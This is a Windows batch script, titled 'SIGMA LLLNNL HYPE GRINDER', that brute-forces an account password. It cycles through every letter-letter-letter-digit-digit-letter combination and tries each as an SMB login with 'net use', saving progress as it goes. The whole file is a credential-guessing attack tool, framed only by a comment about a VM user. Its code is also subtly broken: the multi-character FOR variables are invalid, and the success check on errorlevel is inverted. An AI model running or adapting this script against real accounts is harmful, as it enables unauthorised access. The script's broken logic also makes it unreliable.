@echo off
title SIGMA LLLNNL HYPE GRINDER
setlocal enabledelayedexpansion

:: --- CONFIGURATION ---
set "state_file=sigma_state.txt"
set "log_folder=logs"
set "error_log=%log_folder%\error_log.txt"
set "user=TARGET_USERNAME"        :: CHANGE TO YOUR VM USER
set "letters=abcdefghijklmnopqrstuvwxyz"
set "numbers=0123456789"
set "count=0"
set "save_every=100"              :: save progress every N attempts
set "chunk_size=50000"            :: break loop every chunk to prevent crash

:: --- SETUP LOGS FOLDER ---
if not exist "%log_folder%" mkdir "%log_folder%"
echo SIGMA SESSION START %date% %time% > "%error_log%"

:: --- LOAD LAST COMBO INDEX ---
if exist "%state_file%" (
    set /p count=<"%state_file%"
)

:: --- SIGMA GRIND ---
:generate
set /a combo_count=0
for %%l1 in (%letters%) do (
  for %%l2 in (%letters%) do (
    for %%l3 in (%letters%) do (
      for %%n1 in (%numbers%) do (
        for %%n2 in (%numbers%) do (
          for %%l4 in (%letters%) do (
            set /a count+=1
            set /a combo_count+=1
            if !count! LEQ %count% (
              rem ALREADY DONE
            ) else (
              set "pass=%%l1%%l2%%l3%%n1%%n2%%l4"
              echo [ATTEMPT !count!] !pass!

              :: --- ATTEMPT LOGIN ---
              net use \\127.0.0.1 /user:%user% !pass! >nul 2>> "%error_log%"
              if !errorlevel! EQU 1 (
                  echo [+] PASSWORD FOUND: !pass!
                  pause
                  exit
              )

              :: --- SAVE PROGRESS ---
              if !count! GEQ 1 (
                  set /a mod=!count! %% %save_every%
                  if !mod! EQU 0 (
                      echo !count! > "%state_file%"
                  )
              )

              :: --- CHUNK BREAK ---
              if !combo_count! GEQ %chunk_size% (
                  echo HYPER PAUSE FOR SIGMA STABILITY
                  set /a combo_count=0
                  timeout /t 1 >nul
              )
            )
          )
        )
      )
    )
  )
)
echo SIGMA GRIND COMPLETE, MY TOILET!
pause
exit
